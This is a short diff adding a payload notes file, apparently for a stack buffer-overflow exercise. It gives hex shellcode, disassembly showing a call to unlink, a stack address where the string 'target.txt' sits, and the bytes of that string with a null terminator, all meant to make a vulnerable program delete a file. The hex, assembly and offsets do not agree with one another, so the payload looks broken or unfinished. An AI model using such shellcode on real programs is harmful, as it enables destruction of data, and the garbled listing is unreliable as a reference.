@@ -1,0 +1,34 @@
+payload.txt
+
+482924250000000848893C2500000000E8000000004831C04801242500000008C3
+
+^ corresponds to
+        subq    $8, %rsp
+        movq    $0xff, %rdi
+        call    unlink
+        xorq    %rax, %rax
+        addq    $8, %rsp
+        ret
+
+
+0x7fffffffd0a0 <-- will be the first 't' in "target.txt" + \0
+at str[160]
+
+0:  48 29 24 25 00 00 00    sub    QWORD 0x8,rsp
+7:  08
+0:  48 89 fc                mov    rsp,rdi
+
+10: e8 00 00 00 00          call   15 <_main+0x15>
+18: 48 01 24 25 00 00 00    add    QWORD 0x8,rsp
+1f: 08
+20: c3                      ret
+
+
+
+0:  48 89 fc                mov    rsp,rdi
+
+
+
+
+
+74 61 72 67 65 74 2e 74 78 74 00  # 'target.txt' with nullbyte
